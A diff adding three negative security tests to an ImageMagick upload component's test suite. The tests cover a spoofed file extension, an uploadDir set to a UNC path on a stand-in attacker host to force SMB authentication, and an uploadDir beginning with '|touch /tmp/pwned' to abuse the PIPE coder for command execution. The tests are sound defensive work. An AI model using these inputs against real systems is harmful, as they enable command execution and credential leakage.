@@ -105,6 +105,40 @@ component extends="tests.resources.baseTest" {
                 expect(response.success).toBeFalse();
                 expect(response.type).toBe('ImageMagick.UploadValidationException');
             });
+
+            it('Rejects an upload whose content format does not match its claimed extension (spoofed-extension bypass)', () => {
+                // spoofed_example.png is real jpg_example.jpg bytes saved under a .png name - a real
+                // image ImageMagick would identify as JPEG despite the extension claiming png, the same
+                // extension/content mismatch a crafted MVG/SVG payload disguised as a raster image would rely on
+                var uploadDir = newDir();
+                var response  = postUpload(
+                    filePath = expandPath('/tests/resources/spoofed_example.png'),
+                    outputs  = [{uploadDir: uploadDir, type: 'png'}]
+                );
+
+                expect(response.success).toBeFalse();
+                expect(response.type).toBe('ImageMagick.UploadValidationException');
+            });
+
+            it('Rejects an upload whose uploadDir is a UNC network path (SSRF/credential-leak via forced SMB auth)', () => {
+                var response = postUpload(
+                    filePath = expandPath('/tests/resources/jpg_example.jpg'),
+                    outputs  = [{uploadDir: '\\attacker.test\share', type: 'jpg'}]
+                );
+
+                expect(response.success).toBeFalse();
+                expect(response.type).toBe('ImageMagick.InputValidationException');
+            });
+
+            it('Rejects an upload whose uploadDir starts with a pipe (ImageMagick PIPE coder command execution)', () => {
+                var response = postUpload(
+                    filePath = expandPath('/tests/resources/jpg_example.jpg'),
+                    outputs  = [{uploadDir: '|touch /tmp/pwned', type: 'jpg'}]
+                );
+
+                expect(response.success).toBeFalse();
+                expect(response.type).toBe('ImageMagick.InputValidationException');
+            });
         });
     }
 
